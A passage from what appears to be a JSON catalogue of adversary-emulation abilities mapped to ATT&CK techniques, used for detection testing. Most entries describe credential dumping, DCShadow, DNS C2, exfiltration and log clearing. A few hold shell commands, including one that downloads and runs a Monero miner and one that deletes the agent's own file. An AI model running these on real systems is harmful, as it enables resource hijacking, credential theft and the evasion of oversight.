        "name": "Create local account with admin privileges",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "c74f43a6ba27a277e8214be228a6360f",
        "technique_id": "T1078.003",
        "repeatable": false
    },
    {
        "description": "Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded in multiple processes and write an \n'AtomicTest.txt' file in C:\\Users\\Public\\ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: AppCert DLLs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create registry persistence via AppCert DLL",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "2883ed253a0b6fa034cd76ec72c89d3b",
        "technique_id": "T1546.009",
        "repeatable": false
    },
    {
        "description": "LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\nto view the new shortcut.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create shortcut to cmd in startup folders",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "501af516bd8b24fee0c7c650ae5cc861",
        "technique_id": "T1547.009",
        "repeatable": false
    },
    {
        "description": "create a directory for exfil staging",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Staged: Local Data Staging",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "mkdir -p staged && echo $PWD/staged",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "host.dir.staged",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [
                    "rm -rf staged"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Create staging directory",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
        "technique_id": "T1074.001",
        "repeatable": false
    },
    {
        "description": "Creating W32Time similar named service (win32times) using sc just like threat actor dubbed \"Operation Wocao\"",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Masquerading: Masquerade Task or Service",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Creating W32Time similar named service using sc",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "1f0614ea5c4af6faf1b44570f5f22f8a",
        "technique_id": "T1036.004",
        "repeatable": false
    },
    {
        "description": "Creating W32Time similar named service (win32times) using schtasks just like threat actor dubbed \"Operation Wocao\"",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Masquerading: Masquerade Task or Service",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Creating W32Time similar named service using schtasks",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "7de3d7b4922a7b996d8df36fb22bb118",
        "technique_id": "T1036.004",
        "repeatable": false
    },
    {
        "description": "Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.\nAfter user's logging in cleartext password is saved in C:\\NPPSpy.txt.\nClean up deletes the files and reverses Registry changes.\nNPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Credential Dumping with NPPSpy",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "44df0e5fd9ba43087400e0348aa5ac1c",
        "technique_id": "T1003",
        "repeatable": false
    },
    {
        "description": "Search for possible credentials stored in Registry",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials in Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Credentials in Registry - HKCU",
        "tactic": "credential-access",
        "plugin": "stockpile",
        "ability_id": "3aad5312-d48b-4206-9de4-39866c12e60f",
        "technique_id": "T1552.002",
        "repeatable": false
    },
    {
        "description": "Search for possible credentials stored in the HKLM Hive",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials in Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Credentials in Registry - HKLM",
        "tactic": "credential-access",
        "plugin": "stockpile",
        "ability_id": "98e58fc4-3843-4511-89b1-50cb872e0c9b",
        "technique_id": "T1552.002",
        "repeatable": false
    },
    {
        "description": "Download and execute Monero miner (xmrig) for 1 minute",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Resource Hijacking",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz;\ntar -xf xmrig-6.11.2-linux-x64.tar.gz;\ntimeout 60 ./xmrig-6.11.2/xmrig;\n[ $? -eq 124 ]",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm -rf ./xmrig*;"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 120
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Crypto (Monero) Mining",
        "tactic": "impact",
        "plugin": "stockpile",
        "ability_id": "46da2385-cf37-49cb-ba4b-a739c7a19de4",
        "technique_id": "T1496",
        "repeatable": false
    },
    {
        "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.\nExpected output will include whether the file downloaded successfully or not.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Curl Download File",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "04d923d1b722004f912afca5635cd518",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration\nExpected output will include whether the file uploaded successfully or not.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Curl Upload File",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "f8beff0e35ecdb7cfea66d289bc77b5a",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Obtain user from current session",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "whoami",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Current User",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "bd527b63-9f9e-46e0-9816-b8434d2b8989",
        "technique_id": "T1033",
        "repeatable": false
    },
    {
        "description": "Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n\nIt will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:\nGet-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount\n\nNeed SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.\nThe easiest is to run elevated and as a Domain Admin user.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Rogue Domain Controller",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DCShadow (Active Directory)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "db2ffa8a52a76704b0cf6944e8383b36",
        "technique_id": "T1207",
        "repeatable": false
    },
    {
        "description": "Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.\nWorks against a remote Windows Domain Controller using the replication protocol.\nPrivileges required: domain admin or domain controller account (by default), or any other account with required rights.\n[Reference](https://adsecurity.org/?p=1729)\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: DCSync",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DCSync (Active Directory)",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "31cf0ec60219bc8a36865f2eaddf1fbd",
        "technique_id": "T1003.006",
        "repeatable": false
    },
    {
        "description": "Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)\nhttps://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/\n\nUpon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hijack Execution Flow: DLL Search Order Hijacking",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DLL Search Order Hijacking - amsi.dll",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "63bbedafba2f541552ac3579e9e3737b",
        "technique_id": "T1574.001",
        "repeatable": false
    },
    {
        "description": "GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.\nUpon execution, calc.exe will be opened.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hijack Execution Flow: DLL Side-Loading",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DLL Side-Loading using the Notepad++ GUP.exe binary",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "db9cadf506caece270e0cf2aeff67693",
        "technique_id": "T1574.002",
        "repeatable": false
    },
    {
        "description": "Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hijack Execution Flow: DLL Side-Loading",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DLL Side-Loading using the dotnet startup hook environment variable",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "c3b299c5e0884f167a3c2c2be447067c",
        "technique_id": "T1574.002",
        "repeatable": false
    },
    {
        "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DLP Evasion via Sensitive Data in VBA Macro over HTTP",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "290cb263b74af11c6be2e7345072f05b",
        "technique_id": "T1027",
        "repeatable": false
    },
    {
        "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DLP Evasion via Sensitive Data in VBA Macro over email",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "98ada74a54f1ac18e4201c372c0ef8ad",
        "technique_id": "T1027",
        "repeatable": false
    },
    {
        "description": "This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Application Layer Protocol: DNS",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DNS C2",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "bda00f459bb9118c4c88de426055e180",
        "technique_id": "T1071.004",
        "repeatable": false
    },
    {
        "description": "This test simulates an infected host sending a large volume of DNS queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Application Layer Protocol: DNS",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DNS Large Query Volume",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "920b95f39d124c8a9e7342d88bd54516",
        "technique_id": "T1071.004",
        "repeatable": false
    },
    {
        "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Application Layer Protocol: DNS",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DNS Long Domain Query",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "d9acc651d3e778f0c04700a00f52d52c",
        "technique_id": "T1071.004",
        "repeatable": false
    },
    {
        "description": "This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Application Layer Protocol: DNS",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DNS Regular Beaconing",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "f58b975c94224c4d5f8a28c0744109c3",
        "technique_id": "T1071.004",
        "repeatable": false
    },
    {
        "description": "Identify System domain dns controller on an endpoint using nslookup ldap query. This tool is being abused by qakbot malware to gather information on the domain\ncontroller of the targeted or compromised host. reference https://securelist.com/qakbot-technical-analysis/103931/\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DNS Server Discovery Using nslookup",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "7a5ceaef032a7b9696c9e032574e2476",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "This test simulates an infected host sending a large volume of DoH queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Protocol Tunneling",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DNS over HTTPS Large Query Volume",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "69b202bf0bb7b4ff43d4abb8867c1784",
        "technique_id": "T1572",
        "repeatable": false
    },
    {
        "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Protocol Tunneling",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DNS over HTTPS Long Domain Query",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "a546abab3fca70dd49036e96d8e8dee3",
        "technique_id": "T1572",
        "repeatable": false
    },
    {
        "description": "This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Protocol Tunneling",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DNS over HTTPS Regular Beaconing",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "51e07e3ad45919d52901a7a06646ae91",
        "technique_id": "T1572",
        "repeatable": false
    },
    {
        "description": "DNSExfiltrator allows for transfering (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration Over Alternative Protocol",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "DNSExfiltration (doh)",
        "tactic": "exfiltration",
        "plugin": "atomic",
        "ability_id": "976ba17d4fcab66c2a917b81f54ab654",
        "technique_id": "T1048",
        "repeatable": false
    },
    {
        "description": "Gpg4win is a Windows tool (also called Kleopatra which is the preferred certificate manager) that uses email and file encryption packages for symmetric encryption. It is used by attackers to encrypt disks. User will need to add pass phrase to encrypt file as automation is not allowed under newer versions.",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Encrypted for Impact",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Data Encrypted with GPG4Win",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "2edd8c0ae5c3fe1e732a58e60bdc4f08",
        "technique_id": "T1486",
        "repeatable": false
    },
    {
        "description": "Deadman ability to delete agent file after termination.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: File Deletion",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "path=\"$(pwd)/#{exe_name}\";\nnum_processes=$(for id in $(pgrep -f #{exe_name}); do lsof -p $id 2> /dev/null | grep \"$path\"; done | wc -l);\nif [ \"$num_processes\" -le 1 ]; then /bin/rm -f \"$path\"; fi;",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Deadman - Delete agent file",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "5f844ac9-5f24-4196-a70d-17f0bd44a934",
        "technique_id": "T1070.004",
        "repeatable": false
    },
    {
        "description": "Uses hh.exe to decompile a local compiled HTML Help file.\nUpon successful execution the chm file will decompile to disk.\nReference:https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Decompile Local CHM File",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "cee5c12d61e0f0e4f6614d23330f2384",
        "technique_id": "T1218.001",
        "repeatable": false
    },
    {
        "description": "Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.\nUpon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. \n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Decrypt Mozilla Passwords with Firepwd.py",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "86a1f874f775e156551e30fe039517d8",
        "technique_id": "T1555.003",
        "repeatable": false
    },
    {
        "description": "Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run \"(Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" | Measure-Object).Count\"\nbefore and after the test to verify that the number of prefetch files decreases by 1.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: File Deletion",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete Prefetch File",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "2413b013bc82d152765e2ac34601a327",
        "technique_id": "T1070.004",
        "repeatable": false
    },
    {
        "description": "Clear event logs using built-in PowerShell commands.\nUpon successful execution, you should see the list of deleted event logs\nUpon execution, open the Security.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty or has very few logs in it.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Windows Event Logs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete System Logs Using Clear-EventLog",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6fa417fb183d6c20a67e617c0249f04f",
        "technique_id": "T1070.001",
        "repeatable": false
    },
    {
        "description": "Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.\nThis test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer\nlog file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n\nhttps://twitter.com/SBousseaden/status/1197524463304290305?s=20\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: File Deletion",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete TeamViewer Log Files",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "b0026f9a57639c049490a43d623d7695",
        "technique_id": "T1070.004",
        "repeatable": false
    },
    {
        "description": "Deletes a user account to prevent access. Upon execution, run the command \"net user\" to verify that the new \"AtomicUser\" account was deleted.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Access Removal",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete User - Windows",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "8429e707230a826e7213a51acd219a51",
        "technique_id": "T1531",
        "repeatable": false
    },
    {
        "description": "The following atomic test will delete the Windows Defender scheduled tasks.\n\n[Reference](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete Windows Defender Scheduled Tasks",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "c29edb8de0232248355c1911983620b1",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: File Deletion",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete a single file - Windows PowerShell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "04858322bc6cd08282f2ce96cab5ee7c",
        "technique_id": "T1070.004",
        "repeatable": false
    },
    {
        "description": "Delete a single file from the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: File Deletion",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete a single file - Windows cmd",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "77d396b6c029a11722969cb578f591d3",
        "technique_id": "T1070.004",
        "repeatable": false
    },
    {
        "description": "Recursively delete a folder in the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: File Deletion",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete an entire folder - Windows PowerShell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "36aa805044ab4f4d7f6f372a46c8bab2",
        "technique_id": "T1070.004",
        "repeatable": false
    },
    {
        "description": "Recursively delete a folder in the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: File Deletion",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Delete an entire folder - Windows cmd",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "02e52d5a90c23e35b321e471c78c7823",
        "technique_id": "T1070.004",
        "repeatable": false
    },
    {
        "description": "Remove a downloaded payload file",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: File Deletion",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": null,
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm #{payload}"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Delete payload",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "4cd4eb44-29a7-4259-91ae-e457b283a880",
        "technique_id": "T1070.004",
        "repeatable": false
    },
    {
        "description": "Encode/Decode executable\nUpon execution a file named T1140_calc_decoded.exe will be placed in the temp folder\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Deobfuscate/Decode Files or Information",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Deobfuscate/Decode Files Or Information",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "26c0843592bd870dab849c9f682b09da",
        "technique_id": "T1140",
        "repeatable": false
    },
    {
        "description": "Windows Management Instrumentation(WMI) objects contains system information which helps to detect virtualization. This command will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Virtualization/Sandbox Evasion: System Checks",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Detect Virtualization Environment (Windows)",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "e9e69b4fedb8e40d634865ce9a3192dc",
        "technique_id": "T1497.001",
        "repeatable": false
    },
    {
        "description": "Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. \n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
